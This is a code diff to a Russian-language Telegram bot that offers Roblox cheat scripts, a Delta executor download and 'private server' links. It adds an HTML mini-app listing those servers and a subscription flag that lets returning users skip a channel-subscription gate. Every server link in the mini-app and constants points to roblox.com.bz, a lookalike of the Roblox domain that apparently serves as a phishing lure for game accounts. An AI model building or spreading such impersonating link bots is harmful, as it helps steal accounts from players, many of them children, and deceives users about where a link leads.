@@ -24,6 +24,170 @@ HARDCODED_REFS = {
 KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
 KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"
 
+# ============================================================
+# МИНИ-ПРИЛОЖЕНИЕ (WEB APP) — HTML КОД
+# ============================================================
+WEB_APP_HTML = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Приватные сервера</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a0a2e, #2d1b4e, #4a1a6b, #6b2fa0, #4a1a6b, #2d1b4e, #1a0a2e);
+            background-size: 400% 400%;
+            animation: gradient 8s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 30px 25px;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            transition: transform 0.3s ease;
+        }
+        .container:hover {
+            transform: scale(1.02);
+        }
+        .title {
+            text-align: center;
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-shadow: 0 0 20px rgba(180, 80, 255, 0.5);
+            letter-spacing: 1px;
+        }
+        .server-item {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .server-item:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(180, 80, 255, 0.3);
+            transform: translateX(5px);
+        }
+        .server-item .info {
+            display: flex;
+            flex-direction: column;
+        }
+        .server-item .name {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+        }
+        .server-item .desc {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+        .server-item .badge {
+            background: linear-gradient(135deg, #8b5cf6, #d946ef);
+            padding: 6px 14px;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 600;
+            white-space: nowrap;
+            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+        .footer a {
+            color: rgba(180, 80, 255, 0.8);
+            text-decoration: none;
+        }
+        .glow {
+            text-shadow: 0 0 30px rgba(180, 80, 255, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title glow">🌟 ВСЕ СЕРВЕРА</div>
+        
+        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
+            <div class="info">
+                <span class="name">🔪 MM2 Приватка</span>
+                <span class="desc">Мгновенный доступ</span>
+            </div>
+            <span class="badge">▶ ИГРАТЬ</span>
+        </div>
+
+        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
+            <div class="info">
+                <span class="name">🧸 Adopt Me Приватка</span>
+                <span class="desc">Мгновенный доступ</span>
+            </div>
+            <span class="badge">▶ ИГРАТЬ</span>
+        </div>
+
+        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
+            <div class="info">
+                <span class="name">🇰🇷 Корейский MM2</span>
+                <span class="desc">Корейский сервер</span>
+            </div>
+            <span class="badge">▶ ИГРАТЬ</span>
+        </div>
+
+        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
+            <div class="info">
+                <span class="name">🇰🇷 Корейский Adopt Me</span>
+                <span class="desc">Корейский сервер</span>
+            </div>
+            <span class="badge">▶ ИГРАТЬ</span>
+        </div>
+
+        <div class="server-item" onclick="window.open('https://t.me/freprivatka34', '_blank')">
+            <div class="info">
+                <span class="name">📢 Наш Telegram</span>
+                <span class="desc">Больше приватных серверов</span>
+            </div>
+            <span class="badge">▶ ПЕРЕЙТИ</span>
+        </div>
+
+        <div class="footer">
+            🚀 © 2026 YAKUSHA Team
+        </div>
+    </div>
+</body>
+</html>
+'''
+
 GUIDE_TEXT = """
 📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*
 
@@ -51,7 +215,7 @@ GUIDE_TEXT = """
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT, subscribed BOOLEAN DEFAULT 0)")
     c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT)")
     conn.commit()
     conn.close()
@@ -63,7 +227,7 @@ def add_user(user_id, ref_code=None):
     exists = c.fetchone()
     if not exists:
         try:
-            c.execute("INSERT INTO users (user_id, ref_code) VALUES (?, ?)", (user_id, ref_code))
+            c.execute("INSERT INTO users (user_id, ref_code, subscribed) VALUES (?, ?, 0)", (user_id, ref_code))
             conn.commit()
         except:
             pass
@@ -78,6 +242,21 @@ def add_user(user_id, ref_code=None):
                 pass
     conn.close()
     return False
+
+def set_user_subscribed(user_id):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("UPDATE users SET subscribed = 1 WHERE user_id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+
+def is_user_subscribed(user_id):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT subscribed FROM users WHERE user_id = ?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    return row and row[0] == 1
 
 def get_user_ref_code(user_id):
     conn = sqlite3.connect(DB_FILE)
@@ -152,6 +331,9 @@ DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/
 
 bot = telebot.TeleBot(TOKEN)
 
+# Хранилище Web App данных
+WEB_APP = types.WebAppInfo(url="https://your-webapp-host.com/")  # Замени на реальный URL после загрузки HTML
+
 def notify_admin(text):
     try:
         bot.send_message(ADMIN_ID, text)
@@ -193,6 +375,15 @@ def get_success_keyboard():
     keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
     keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
     keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
+    
+    # ============================================================
+    # НОВАЯ КНОПКА "ВСЕ СЕРВЕРА" С МИНИ-ПРИЛОЖЕНИЕМ
+    # ============================================================
+    keyboard.add(types.InlineKeyboardButton(
+        text="🌐 ВСЕ СЕРВЕРА 🚀", 
+        web_app=WEB_APP
+    ))
+    
     keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
     keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
     keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
@@ -219,6 +410,11 @@ def start(message):
     if is_new:
         user = message.from_user
         notify_admin(f"🆕 Новый пользователь!\n\n🆔 ID: {user.id}\n👤 Имя: {user.first_name}\n📛 @{user.username or 'нет'}\n👥 Всего: {count_users()}")
+    
+    # ПРОВЕРКА: если пользователь уже подписан — сразу даём доступ
+    if is_user_subscribed(message.from_user.id):
+        bot.send_message(message.chat.id, "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
+        return
     
     if is_ref:
         bot.send_message(message.chat.id, "🔗 Ты перешёл по реферальной ссылке!\n\nПодпишись на каналы и нажми проверить:", reply_markup=get_channels_keyboard(is_ref=True))
@@ -269,6 +465,9 @@ def user_callback(call):
         is_ref = action == "check_sub_ref"
         not_subbed = get_unsubscribed_channels(user_id)
         if not not_subbed:
+            # ПОМЕЧАЕМ ПОЛЬЗОВАТЕЛЯ КАК ПОДПИСАННОГО
+            set_user_subscribed(user_id)
+            
             if is_ref:
                 ref_code = get_user_ref_code(user_id)
                 ref_msg = get_ref_message(ref_code) if ref_code else None
